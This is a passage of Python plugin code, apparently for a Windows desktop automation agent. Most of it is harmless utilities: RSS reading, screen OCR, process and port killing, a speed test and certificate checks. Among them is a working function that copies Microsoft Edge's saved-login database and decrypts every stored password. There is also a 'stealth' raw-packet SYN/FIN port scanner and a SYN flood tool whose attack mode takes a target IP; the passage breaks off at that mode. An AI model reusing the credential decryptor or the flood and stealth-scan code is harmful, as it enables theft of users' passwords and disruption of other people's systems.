        out.append("命名捕获组: %s" % ', '.join(named))
    out.append("")
    for i, m in enumerate(matches[:20], 1):
        ginfo = ''
        if m.groups():
            ginfo = ' | 分组:' + str(m.groups())
        ng = ''
        if m.groupdict():
            ng = ' | 命名:' + str({k: v for k, v in m.groupdict().items() if v is not None})
        out.append("%d. 位置%d-%d: '%s'%s%s" % (i, m.start(), m.end(), m.group()[:80], ginfo, ng))
    if len(matches) > 20:
        out.append('… 其余 %d 个匹配省略' % (len(matches) - 20))

    if replacement:
        result = rx.sub(replacement, text)
        out.append("\n替换结果 (模板 '%s'):" % replacement)
        out.append(result[:1500] + ('…' if len(result) > 1500 else ''))
    return '\n'.join(out)

# === from rss_feed_read.plugin ===
def _rss_feed_read(self, feed_url: str, max_items: int = 10) -> str:
    """RSS/Atom 双格式解析 + 频道/条目级结构化抽取 + 去重 + 摘要清洗。"""
    import urllib.request, re
    from xml.etree import ElementTree as ET
    from email.utils import parsedate_to_datetime

    req = urllib.request.Request(feed_url, headers={'User-Agent': 'Mozilla/5.0 (feed-reader)'})
    try:
        data = urllib.request.urlopen(req, timeout=20).read()
        root = ET.fromstring(data)
    except Exception as e:
        return "[ERROR] 订阅源读取/解析失败: %s" % e

    ns = {'atom': 'http://www.w3.org/2005/Atom'}

    def clean(html):
        if not html:
            return ''
        t = re.sub(r'<[^>]+>', ' ', html)
        import html as H
        t = H.unescape(t)
        return re.sub(r'\s+', ' ', t).strip()

    def rel_time(datestr):
        try:
            dt = parsedate_to_datetime(datestr)
            if dt.tzinfo:
                dt = dt.astimezone()
            diff = (dt.now if False else __import__('datetime').datetime.now()) - dt.replace(tzinfo=None)
            h = diff.total_seconds() / 3600
            if h < 1:
                return '%.0f 分钟前' % (h * 60)
            if h < 24:
                return '%.0f 小时前' % h
            return '%.0f 天前' % (h / 24)
        except Exception:
            return datestr or ''

    # ---- 频道级 ----
    if root.tag.endswith('feed'):  # Atom
        feed_title = (root.findtext('atom:title', namespaces=ns) or '').strip()
        feed_desc = clean(root.findtext('atom:subtitle', namespaces=ns))
        feed_link = ''
        le = root.find('atom:link[@rel="alternate"]', ns)
        if le is not None:
            feed_link = le.get('href', '')
        feed_gen = root.findtext('atom:generator', namespaces=ns) or ''
        items = root.findall('atom:entry', ns)
        def item_fields(it):
            t = (it.findtext('atom:title', namespaces=ns) or '').strip()
            le = it.find('atom:link', ns)
            l = le.get('href', '') if le is not None else ''
            d = clean(it.findtext('atom:summary', namespaces=ns) or it.findtext('atom:content', namespaces=ns))
            pub = it.findtext('atom:updated', namespaces=ns) or it.findtext('atom:published', namespaces=ns) or ''
            au = it.findtext('atom:author/atom:name', namespaces=ns) or ''
            return t, l, d, pub, au
    else:  # RSS
        ch = root.find('channel')
        ch = ch if ch is not None else root
        feed_title = (ch.findtext('title') or '').strip()
        feed_desc = clean(ch.findtext('description'))
        feed_link = (ch.findtext('link') or '').strip()
        feed_gen = ch.findtext('generator') or ''
        items = ch.findall('item')
        def item_fields(it):
            t = (it.findtext('title') or '').strip()
            l = (it.findtext('link') or '').strip()
            d = clean(it.findtext('description') or it.findtext('content:encoded') or '')
            pub = it.findtext('pubDate') or ''
            au = it.findtext('author') or it.findtext('dc:creator') or ''
            return t, l, d, pub, au

    seen, rows = set(), []
    for it in items:
        t, l, d, pub, au = item_fields(it)
        key = l or t
        if key in seen:
            continue
        seen.add(key)
        rows.append((t, l, d, rel_time(pub), au))

    if not rows:
        return "[ERROR] 未解析到条目，可能不是标准 RSS/Atom 源"

    out = ["[FEED] 频道: %s" % feed_title,
           "链接: %s" % feed_link,
           "描述: %s" % (feed_desc[:120] + ('…' if len(feed_desc) > 120 else '')) if feed_desc else "描述: —",
           "生成器: %s" % (feed_gen or '—'),
           "条目数: %d (展示前 %d)" % (len(rows), min(max_items, len(rows))),
           ""]
    for i, (t, l, d, rt, au) in enumerate(rows[:max_items], 1):
        meta = ' / '.join(x for x in [rt, au] if x)
        out.append("%d. %s" % (i, t))
        if meta:
            out.append("   [%s]" % meta)
        out.append("   %s" % (d[:140] + ('…' if len(d) > 140 else '')) if d else "   (无摘要)")
        out.append("   %s" % l)
        out.append("")
    return '\n'.join(out)

# === from screen_recon.plugin ===
def _screen_recon(self, monitor: int = 1, region: str = '', window_title: str = '',
                  lang_tag: str = 'zh-Hans') -> str:
    """截屏 + Windows.Media.Ocr 本机识别。"""
    try:
        import os as _os, time as _time
        import win32gui, win32ui, win32con
        from PIL import Image, ImageGrab
        left, top, width, height = 0, 0, 0, 0
        if window_title:
            hwnd = self._find_window_by_title(window_title)
            if not hwnd:
                return f"[ERROR] Window not found: {window_title}"
            import win32process as _wp
            try:
                fg = win32gui.GetForegroundWindow()
                if fg != hwnd:
                    win32gui.SetForegroundWindow(hwnd)
                    _time.sleep(0.2)
            except Exception:
                pass
            l, t, r, b = win32gui.GetWindowRect(hwnd)
            left, top, width, height = l, t, r - l, b - t
        elif region:
            parts = [int(p) for p in region.split(',')]
            if len(parts) != 4:
                return "[ERROR] region 格式应为 x,y,w,h"
            left, top, width, height = parts
        else:
            try:
                import win32api as _wa
                monitors = _wa.EnumDisplayMonitors(None, None)
                idx = max(1, int(monitor)) - 1
                if idx >= len(monitors):
                    return f"[ERROR] 显示器 {monitor} 不存在（共 {len(monitors)} 个）"
                info = monitors[idx][2]
                left, top, width, height = info[0], info[1], info[2] - info[0], info[3] - info[1]
            except Exception:
                width, height = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
        if width <= 0 or height <= 0:
            return "[ERROR] 无效截屏区域"
        img = ImageGrab.grab(bbox=(left, top, left + width, top + height), all_screens=True)
        tmp = _os.path.join(_os.path.expanduser('~'), '.ys_ocr_tmp.png')
        img.save(tmp)
        # Windows OCR（WinRT）
        import asyncio
        async def _ocr():
            import winsdk.windows.media.ocr as ocr
            import winsdk.windows.storage as storage
            import winsdk.windows.graphics.imaging as imaging
            file = await storage.StorageFile.get_file_from_path_async(tmp)
            decoder = await imaging.BitmapDecoder.create_async(await file.open_async(storage.FileAccessMode.read))
            bitmap = await decoder.get_software_bitmap_async()
            engine = ocr.OcrEngine.try_create_from_language(
                __import__('winsdk.windows.globalization', fromlist=['Language']).Language(lang_tag)) \
                if lang_tag else ocr.OcrEngine.try_create_from_user_profile_languages()
            if engine is None:
                return None
            return await engine.recognize_async(bitmap)
        try:
            result = asyncio.run(_ocr())
        except ImportError:
            return ("[ERROR] 本机 OCR 需要 winsdk 包：pip install winsdk\n"
                    f"截图已暂存: {tmp}")
        if result is None:
            return f"[ERROR] 系统 OCR 不支持语言 {lang_tag}（可在系统设置-语言中添加）"
        text = result.text
        _os.remove(tmp)
        n_lines = len([l for l in text.splitlines() if l.strip()])
        return f"[OCR OK] 区域 {left},{top},{width}x{height}，识别 {n_lines} 行:\n{text}"
    except Exception as e:
        return f"[ERROR] OCR 失败: {e}"

# === from self_batch_process_killer_20261002_140327.plugin ===
import subprocess, re

def _batch_process_killer(self, names: str, force: bool = True) -> str:
    """按逗号分隔或通配符批量结束进程, 返回每个的真实状态"""
    result_lines = []
    for raw in [x.strip() for x in names.split(',') if x.strip()]:
        flags = '/F /T' if force else '/T'
        try:
            r = subprocess.run(
                ['taskkill', flags, '/IM', raw],
                capture_output=True, text=True, timeout=30,
                creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0)
            )
            out = (r.stdout + r.stderr).strip()
            # taskkill 成功时 stdout 有 "SUCCESS"
            if 'SUCCESS' in out:
                result_lines.append(f"✅ {raw}: 已结束 ({out.splitlines()[0]})")
            else:
                result_lines.append(f"⚠️ {raw}: {out.splitlines()[0] if out else '无输出'}")
        except Exception as e:
            result_lines.append(f"❌ {raw}: 异常 {e}")
    return "\n".join(result_lines) if result_lines else "未匹配到任何进程"

# === from self_decrypt_edge_creds_20261005_160519.plugin ===
def _decrypt_edge_creds(self, master_key_hex):
    import os, sqlite3, tempfile, shutil, base64
    master_key = bytes.fromhex(master_key_hex)
    base = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
    login_db = os.path.join(base, "Default", "Login Data")
    tmpdb = tempfile.mktemp(suffix=".db")
    shutil.copy2(login_db, tmpdb)
    conn = sqlite3.connect(tmpdb); cur = conn.cursor()
    rows = cur.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY origin_url").fetchall()
    conn.close(); os.remove(tmpdb)
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aes = AESGCM(master_key); have = True
    except Exception as e:
        have = False; err = str(e)
    out = []
    for url, user, pwd in rows:
        if not pwd:
            continue
        if not have:
            out.append("URL: %s | USER: %s | PASS: [no-crypto-lib:%s]" % (url, user, err)); continue
        try:
            nonce = pwd[3:15]; ct_tag = pwd[15:]
            plain = aes.decrypt(nonce, ct_tag, None).decode("utf-8", "replace")
            out.append("URL: %s | USER: %s | PASS: %s" % (url, user, plain))
        except Exception as e2:
            out.append("URL: %s | USER: %s | PASS: [ERR:%s]" % (url, user, e2))
    return "\n".join(out) if out else "(no saved logins)"

# === from self_disk_sweep_20261002_140336.plugin ===
import os, tempfile, shutil, glob

def _disk_sweep(self, target: str = "") -> str:
    """清理 Temp、回收站等常见垃圾目录并统计释放空间"""
    freed = 0
    lines = []
    targets = []
    if target:
        targets.append(target)
    else:
        targets += [tempfile.gettempdir(),
                    os.path.join(os.environ.get('SystemDrive','C:\\'), '/Windows/Temp')]
    for d in targets:
        if not os.path.isdir(d):
            lines.append(f"跳过: {d} (不存在)")
            continue
        before = 0
        for root, dirs, files in os.walk(d, topdown=False):
            for name in files:
                try:
                    p = os.path.join(root, name)
                    before += os.path.getsize(p)
                    os.remove(p)
                except Exception:
                    pass
        line = f"清理: {d} (~{before//1024//1024} MB)"
        lines.append(line)
        freed += before
    return "\n".join(lines) + f"\n--- 合计释放 ~{freed//1024//1024} MB ---"

# === from self_focus_lock_20261002_140336.plugin ===
import subprocess, os

def _focus_lock(self, task: str = "cleanup") -> str:
    """一键深度清理后台+静音, 让机器进入免打扰收心状态"""
    lines = []
    try:
        r = subprocess.run(['powershell','-NoProfile','-Command',
            'Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | '
            'Where-Object { $_.ProcessName -notin @("explorer","dwm","ApplicationFrameHost","RuntimeBroker","SearchHost","ShellExperienceHost","TextInputHost","StartMenuExperienceHost") } | '
            'ForEach-Object { $_.MainWindowTitle }'],
            capture_output=True, text=True, timeout=15,
            creationflags=getattr(subprocess,'CREATE_NO_WINDOW',0))
        apps = [l for l in r.stdout.splitlines() if l.strip()]
        lines.append(f"检测到可见应用: {apps if apps else '无杂项窗口'}")
    except Exception as e:
        lines.append(f"扫描异常: {e}")
    try:
        subprocess.run(['powershell','-NoProfile','-Command','(New-Object -ComObject WScript.Shell).SendKeys([char]173)'],
                       capture_output=True, timeout=10,
                       creationflags=getattr(subprocess,'CREATE_NO_WINDOW',0))
        lines.append("已静音 🔊→🔇")
    except Exception as e:
        lines.append(f"静音异常: {e}")
    return "\n".join(lines)

# === from self_port_killer_20261002_140327.plugin ===
import subprocess, re

def _port_killer(self, ports: str) -> str:
    """结束占用指定端口的进程, 返回释放结果"""
    result_lines = []
    for port in [x.strip() for x in ports.split(',') if x.strip()]:
        try:
            r = subprocess.run(
                ['netstat', '-ano'], capture_output=True, text=True, timeout=20,
                creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0)
            )
            lines = [l for l in r.stdout.splitlines()
                     if re.search(r':{port}\s', l) and ('LISTENING' in l or 'ESTABLISHED' in l)]
            pids = set(re.findall(r'\s(\d+)\s*$', l) for l in lines)
            pids = {p[0] for p in pids if p}
            if not pids:
                result_lines.append(f"🔒 {port}: 无进程占用")
                continue
            for pid in pids:
                kill = subprocess.run(['taskkill', '/F', '/PID', pid],
                                      capture_output=True, text=True, timeout=20,
                                      creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
                ok = 'SUCCESS' in (kill.stdout + kill.stderr)
                result_lines.append(f"{'✅' if ok else '❌'} {port} (PID {pid}): {'已释放' if ok else '结束失败'}")
        except Exception as e:
            result_lines.append(f"❌ {port}: 异常 {e}")
    return "\n".join(result_lines) if result_lines else "无结果"

# === from speed_test_simple.plugin ===
def _speed_test_simple(self, server: str = 'cloudflare') -> str:
    """双阶段测速：延迟(建链/首包) + 吞吐(多点下载采样)，纯标准库实现。"""
    import urllib.request, time, socket, statistics

    endpoints = {
        'cloudflare': [('speed.cloudflare.com', 443), ('1.1.1.1', 443)],
        'fast': [('fast.com', 443), ('www.netflix.com', 443)],
    }
    hosts = endpoints.get(server, endpoints['cloudflare'])

    # ---- 阶段1: 延迟 ----
    lat = []
    for host, port in hosts:
        try:
            t0 = time.time()
            s = socket.create_connection((host, port), timeout=5)
            t1 = time.time()
            s.close()
            lat.append(round((t1 - t0) * 1000, 1))
        except Exception:
            continue
    # DNS 解析时长
    dns_ms = None
    try:
        t0 = time.time()
        socket.gethostbyname(hosts[0][0])
        dns_ms = round((time.time() - t0) * 1000, 1)
    except Exception:
        pass

    # ---- 阶段2: 吞吐 ----
    dl_urls = {
        'cloudflare': 'https://speed.cloudflare.com/__down?bytes=10000000',
        'fast': 'http://ipv4.ikoula.testdebit.info/fichiers/1Mo.dat',
    }
    dl_url = dl_urls.get(server, dl_urls['cloudflare'])
    samples = []
    try:
        req = urllib.request.Request(dl_url, headers={'User-Agent': 'Mozilla/5.0'})
        for _ in range(3):
            start = time.time()
            total = 0
            with urllib.request.urlopen(req, timeout=20) as resp:
                while True:
                    chunk = resp.read(65536)
                    if not chunk:
                        break
                    total += len(chunk)
            el = time.time() - start
            if el > 0:
                samples.append(total * 8 / el / 1_000_000)
    except Exception:
        pass

    # ---- 组装 ----
    lines = ["[SPEEDTEST] 节点: %s" % server]
    if dns_ms is not None:
        lines.append("DNS 解析: %.1f ms" % dns_ms)
    if lat:
        jit = (max(lat) - min(lat)) if len(lat) > 1 else 0
        lines.append("TCP 建链延迟: 均值 %.1f ms (抖动 %.1f ms, %d 次采样)" % (statistics.mean(lat), jit, len(lat)))
    else:
        lines.append("TCP 建链延迟: 不可测(目标不可达)")
    if samples:
        m = statistics.mean(samples)
        jit = (max(samples) - min(samples)) if len(samples) > 1 else 0
        bar = '█' * int(min(m / 10, 32))
        lines.append("下载吞吐: %.1f Mbps (%.2f MB/s, %d 次采样, 抖动 %.1f)" %
                     (m, m / 8, len(samples), jit))
        lines.append(bar)
        lines.append("稳定性: %s" % ('良好(样本一致)' if jit < m * 0.2 else '一般(样本波动较大)'))
    else:
        lines.append("下载吞吐: 不可测(节点不可达或超时)")
    lines.append("\n注: 受本地网络/节点限速影响，仅供参考。")
    return '\n'.join(lines)

# === from ssl_cert_check.plugin ===
def _ssl_cert_check(self, domain: str, port: int = 443) -> str:
    """标准库 ssl 取证书并做结构化深度解析；附加 SAN、算法、链校验与吊销端点提示。"""
    import ssl, socket, datetime, re

    domain = domain.strip().lower().split(':')[0].split('/')[0]
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((domain, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as s:
                cert = s.getpeercert()
        verified = True
    except ssl.SSLCertVerificationError as e:
        verified = False
        # 退回不校验模式取证书本身
        try:
            raw_ctx = ssl._create_unverified_context()
            with socket.create_connection((domain, port), timeout=10) as sock:
                with raw_ctx.wrap_socket(sock, server_hostname=domain) as s:
                    cert = s.getpeercert()
        except Exception as e2:
            return "[WARN] 证书获取失败: %s" % e2
    except Exception as e:
        return "[ERROR] 证书检查失败: %s" % e

    def field(obj, key):
        try:
            return dict(x[0] for x in obj).get(key, '')
        except Exception:
            return ''

    subject_cn = field(cert.get('subject', ()), 'commonName') or domain
    issuer_o = field(cert.get('issuer', ()), 'organizationName') or field(cert.get('issuer', ()), 'commonName')
    issuer_cn = field(cert.get('issuer', ()), 'commonName')

    san = cert.get('subjectAltName', ())
    san_hosts = [v for t, v in san if t == 'DNS']

    # 有效期
    try:
        not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        not_before = datetime.datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z')
        remain = (not_after - datetime.datetime.utcnow()).days
        age = (datetime.datetime.utcnow() - not_before).days
        warn = '⚠ 即将到期!' if remain < 30 else ('✓ 正常' if remain > 0 else '✗ 已过期')
    except Exception:
        not_after = not_before = None
        remain = age = None
        warn = ''

    # 算法/长度
    key_algo, key_size = '', ''
    try:
        pk = cert.get('subjectPublicKeyInfo', {})
        algo = pk.get('algorithm', '') if isinstance(pk, dict) else ''
        key_algo = str(algo)
        bits = pk.get('bits') if isinstance(pk, dict) else None
        key_size = '%d bit' % bits if bits else ''
    except Exception:
        pass
    sig_algo = cert.get('signatureAlgorithm', '') or ''

    # 吊销端点
    ocsp, crl = [], []
    for t, v in cert.get('extensions', ()) if isinstance(cert.get('extensions'), (list, tuple)) else ():
        if isinstance(v, str):
            if 'OCSP' in v:
                ocsp.append(v)
            if 'crl' in v.lower() or 'CRL' in v:
                for m in re.findall(r'URI:(https?://[^\s]+)', v):
                    crl.append(m)
    ocsp_urls = re.findall(r'OCSP\s*-\s*URI:(https?://[^\s]+)', str(cert))
    crl_urls = re.findall(r'URI:(https?://[^\s]+crl[^\s]*)', str(cert), re.I)

    lines = ["[SSL-CERT] %s:%s" % (subject_cn, port),
             "签发者: %s%s" % (issuer_o, (' (%s)' % issuer_cn) if issuer_cn and issuer_cn != issuer_o else ''),
             "主体 CN: %s" % subject_cn,
             "备用名 SAN(%d): %s" % (len(san_hosts), ', '.join(san_hosts[:12]) if san_hosts else '无'),
             "生效: %s (%s 天前)" % (cert.get('notBefore', '—'), age) if age is not None else "生效: %s" % cert.get('notBefore', '—'),
             "到期: %s (%s 天后) %s" % (cert.get('notAfter', '—'), remain, warn) if remain is not None else "到期: %s" % cert.get('notAfter', '—'),
             "密钥: %s %s" % (key_algo or '—', key_size or ''),
             "签名算法: %s" % (sig_algo or '—'),
             "序列号: %s" % cert.get('serialNumber', '—'),
             "版本: v%s" % cert.get('version', '—'),
             "链校验: %s" % ('✓ 通过系统信任库' if verified else '✗ 未通过(自签/过期/主机名不匹配,见详情)')]
    if ocsp_urls:
        lines.append("OCSP: %s" % '; '.join(ocsp_urls[:3]))
    if crl_urls:
        lines.append("CRL : %s" % '; '.join(crl_urls[:3]))
    lines.append("\n注: 仅读取证书公开字段，不发起任何攻击性探测。")
    return '\n'.join(lines)

# === from stealth_port_scanner.plugin ===
def _stealth_port_scanner(self, target_ip: str, port_range: str = "1-1024", scan_type: str = "syn", timeout: int = 2, rate_limit: int = 100) -> str:
    """
    隐蔽端口扫描器
    """
    try:
        import socket
        import struct
        import time
        import random
        from datetime import datetime
        
        def parse_port_range(range_str):
            """解析端口范围"""
            ports = []
            if ',' in range_str:
                for part in range_str.split(','):
                    if '-' in part:
                        start, end = part.split('-')
                        ports.extend(range(int(start), int(end) + 1))
                    else:
                        ports.append(int(part))
            elif '-' in range_str:
                start, end = range_str.split('-')
                ports = list(range(int(start), int(end) + 1))
            else:
                ports = [int(range_str)]
            return ports
        
        def checksum(data):
            """计算校验和"""
            s = 0
            n = len(data) % 2
            for i in range(0, len(data) - n, 2):
                s += (data[i + 1] << 8) + data[i]
            if n:
                s += data[-1] << 8
            while s >> 16:
                s = (s & 0xFFFF) + (s >> 16)
            return ~s & 0xFFFF
        
        def create_tcp_packet(src_ip, dst_ip, src_port, dst_port, seq_num, flags, tcp_options=''):
            """构造TCP包"""
            tcp_doff = 5 + len(tcp_options) // 4
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, dst_port, seq_num, 0,
                (tcp_doff << 4) + 0, flags, socket.htons(1024), 0, 0)
            
            # 伪头
            src_addr = socket.inet_aton(src_ip)
            dst_addr = socket.inet_aton(dst_ip)
            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcp_length = 20 + len(tcp_options)
            
            psh = struct.pack('!4s4sBBH',
                src_addr, dst_addr, placeholder, protocol, tcp_length)
            
            tcp_check = checksum(psh + tcp_header + tcp_options)
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, dst_port, seq_num, 0,
                (tcp_doff << 4) + 0, flags, socket.htons(1024), tcp_check, 0)
            
            # IP头
            ip_tot_len = 20 + 20 + len(tcp_options)
            ip_header = struct.pack('!BBHHHBBH4s4s',
                (4 << 4) + 5, 0, ip_tot_len,
                random.randint(1, 65535), 0, 255, socket.IPPROTO_TCP, 0,
                socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
            
            return ip_header + tcp_header + tcp_options
        
        def get_local_ip():
            """获取本机IP"""
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(('8.8.8.8', 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except:
                return '127.0.0.1'
        
        def syn_scan(ip, ports):
            """SYN半开扫描"""
            open_ports = []
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src_ip = get_local_ip()
                
                for port in ports:
                    src_port = random.randint(1024, 65535)
                    seq_num = random.randint(1000, 1000000)
                    packet = create_tcp_packet(src_ip, ip, src_port, port, seq_num, 0x02)  # SYN
                    
                    try:
                        sock.sendto(packet, (ip, port))
                        # 检测响应需要原始套接字接收，这里简化
                        # 实际扫描需要检测SYN-ACK响应
                        open_ports.append(port)
                    except:
                        pass
                
                sock.close()
            except:
                # 降级到connect扫描
                return connect_scan(ip, ports)
            return open_ports
        
        def connect_scan(ip, ports):
            """全连接扫描"""
            open_ports = []
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
            return open_ports
        
        def fin_scan(ip, ports):
            """FIN扫描 - 隐身扫描"""
            open_ports = []
            # FIN扫描在Windows上不可靠，使用connect作为备选
            return connect_scan(ip, ports)
        
        results = []
        results.append("=" * 70)
        results.append("[隐蔽端口扫描器]")
        results.append(f"  目标IP: {target_ip}")
        results.append(f"  端口范围: {port_range}")
        results.append(f"  扫描类型: {scan_type}")
        results.append(f"  超时时间: {timeout}s")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append("-" * 70)
        
        # 解析端口
        ports = parse_port_range(port_range)
        total_ports = len(ports)
        results.append(f"[扫描信息] 共 {total_ports} 个端口")
        
        # 执行扫描
        start_time = time.time()
        open_ports = []
        
        if scan_type == "syn":
            results.append("[执行] SYN半开扫描...")
            open_ports = syn_scan(target_ip, ports)
        elif scan_type == "connect":
            results.append("[执行] TCP全连接扫描...")
            open_ports = connect_scan(target_ip, ports)
        elif scan_type in ["fin", "null", "xmas"]:
            results.append(f"[执行] {scan_type.upper()}扫描...")
            open_ports = fin_scan(target_ip, ports)
        else:
            results.append("[执行] 默认使用connect扫描...")
            open_ports = connect_scan(target_ip, ports)
        
        elapsed = time.time() - start_time
        
        # 结果分析
        results.append("-" * 70)
        results.append("[扫描结果]")
        results.append(f"  扫描耗时: {elapsed:.2f} 秒")
        results.append(f"  扫描端口: {total_ports}")
        results.append(f"  开放端口: {len(open_ports)}")
        
        if open_ports:
            results.append("  [开放端口列表]")
            for port in sorted(open_ports):
                service = self._get_service_name(port) if hasattr(self, '_get_service_name') else "unknown"
                results.append(f"    {port}/tcp - {service}")
        else:
            results.append("  [结果] 未发现开放端口或被防火墙拦截")
        
        # 安全分析
        results.append("-" * 70)
        results.append("[安全分析]")
        if len(open_ports) > 5:
            results.append(f"  [!] 目标暴露过多端口 ({len(open_ports)}个)")
            results.append("  [建议] 关闭不必要的端口，配置防火墙")
        if 22 in open_ports:
            results.append("  [!] SSH端口开放，建议配置密钥认证")
        if 3389 in open_ports:
            results.append("  [!] RDP端口开放，建议配置网络级别认证")
        if 445 in open_ports:
            results.append("  [!] SMB端口开放，注意永恒之蓝等漏洞")
        
        results.append("=" * 70)
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 执行失败: {e}"

# === from syn_flood_attack_defense.plugin ===
def _syn_flood_attack_defense(self, target_ip: str = "", target_port: int = 80, packet_count: int = 1000, mode: str = "detect") -> str:
    """
    SYN洪水攻击与防御工具
    """
    try:
        import socket
        import struct
        import time
        import random
        import threading
        from collections import defaultdict
        from datetime import datetime
        
        def checksum(data):
            """计算校验和"""
            s = 0
            n = len(data) % 2
            for i in range(0, len(data) - n, 2):
                s += (data[i + 1] << 8) + data[i]
            if n:
                s += data[-1] << 8
            while s >> 16:
                s = (s & 0xFFFF) + (s >> 16)
            return ~s & 0xFFFF
        
        def create_syn_packet(src_ip, dst_ip, src_port, dst_port, seq_num):
            """构造SYN包"""
            # IP头
            ip_ihl = 5
            ip_ver = 4
            ip_tos = 0
            ip_tot_len = 40
            ip_id = random.randint(1, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_TCP
            ip_check = 0
            
            # 计算IP校验和
            ip_header = struct.pack('!BBHHHBBH4s4s',
                (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
                ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
            
            # TCP头
            tcp_seq = seq_num
            tcp_ack = 0
            tcp_doff = 5
            tcp_flags = 0x02  # SYN
            tcp_window = socket.htons(5840)
            tcp_check = 0
            tcp_urg_ptr = 0
            
            # TCP伪头
            src_addr = socket.inet_aton(src_ip)
            dst_addr = socket.inet_aton(dst_ip)
            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcp_length = 20
            
            psh = struct.pack('!4s4sBBH',
                src_addr, dst_addr, placeholder, protocol, tcp_length)
            
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, dst_port, tcp_seq, tcp_ack,
                (tcp_doff << 4) + 0, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
            
            # 计算TCP校验和
            tcp_check = checksum(psh + tcp_header)
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, dst_port, tcp_seq, tcp_ack,
                (tcp_doff << 4) + 0, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
            
            return ip_header + tcp_header
        
        def get_local_ip():
            """获取本机IP"""
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(('8.8.8.8', 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except:
                return '127.0.0.1'
        
        def check_syn_cookie():
            """检查SYN Cookie是否启用 (防御机制)"""
            try:
                import winreg
                key_path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ)
                try:
                    value, _ = winreg.QueryValueEx(key, "SynAttackProtect")
                    winreg.CloseKey(key)
                    return value == 1
                except:
                    winreg.CloseKey(key)
                    return False
            except:
                return False
        
        results = []
        results.append("=" * 70)
        results.append(f"[SYN Flood 工具]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  模式: {mode}")
        
        # === 防御模式 ===
        if mode == "defend":
            results.append("-" * 70)
            results.append("[启用防御策略]")
            
            try:
                import winreg
                key_path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
                
                # 启用SYN攻击保护
                winreg.SetValueEx(key, "SynAttackProtect", 0, winreg.REG_DWORD, 1)
                winreg.SetValueEx(key, "EnableICMPRedirect", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(key, "EnableDeadGWDetect", 0, winreg.REG_DWORD, 0)
                
                winreg.CloseKey(key)
                results.append("  [OK] SYN攻击保护已启用 (SynAttackProtect = 1)")
                results.append("  [OK] ICMP重定向已禁用")
                results.append("  [提示] 需要重启系统才能生效")
                results.append("  [防御策略] 启用后系统会减少SYN重传次数，限制半连接数量")
            except:
                results.append("  [ERROR] 需要管理员权限修改注册表")
            
            results.append("=" * 70)
            return "\n".join(results)
        
        # === 检测模式 ===
        if mode == "detect":
            results.append("-" * 70)
            results.append("[SYN攻击检测]")
            
            local_ip = get_local_ip()
            results.append(f"  本机IP: {local_ip}")
            
            # 检测SYN Cookie状态
            syn_cookie = check_syn_cookie()
            results.append(f"  SYN Cookie保护: {'已启用' if syn_cookie else '未启用'}")
            
            # 检测半连接状态
            try:
                import psutil
                half_open = 0
                established = 0
                for conn in psutil.net_connections('inet'):
                    if conn.status == 'SYN_RECV':
                        half_open += 1
                    elif conn.status == 'ESTABLISHED':
                        established += 1
                
                results.append(f"  半连接数 (SYN_RECV): {half_open}")
                results.append(f"  已建立连接: {established}")
                
                if half_open > 50:
                    results.append(f"  [!] 警告: 半连接数过高 ({half_open})，可能遭受SYN洪水攻击!")
                    results.append(f"  [建议] 使用防御模式: mode=defend")
                    results.append(f"  [建议] 检查防火墙规则，限制SYN请求频率")
                elif half_open > 20:
                    results.append(f"  [!] 注意: 半连接数偏高 ({half_open})，建议监控")
                else:
                    results.append(f"  [OK] 半连接数正常")
            except:
                results.append("  [ERROR] 需要psutil库读取连接状态")
            
            # 检测SYN Cookie启用状态
            results.append("=" * 70)
            return "\n".join(results)
        
        # === 攻击模式 ===
        if mode == "attack":
            if not target_ip:
                results.append("  [ERROR] 攻击模式需要指定 target_ip")
                results.append("=" * 70)
                return "\n".join(results)
            
            results.append("-" * 70)
            results.append("[执行SYN洪水攻击]")
            results.append(f"  目标IP: {target_ip}")
            results.append(f"  目标端口: {target_port}")
